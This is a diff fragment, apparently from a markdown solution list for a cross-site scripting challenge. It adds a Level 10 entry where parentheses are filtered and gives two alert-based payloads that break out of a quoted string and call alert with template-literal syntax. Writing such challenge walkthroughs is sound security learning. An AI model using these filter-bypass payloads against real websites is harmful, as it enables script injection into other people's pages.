@@ -63,3 +63,10 @@ XSS&action=javascript:alert(1337)
 ```
 
 ## Level 10
+
+- Filters ```(```
+
+```html
+');alert`1`;//
+');/**/onerror=alert`1`//
+```
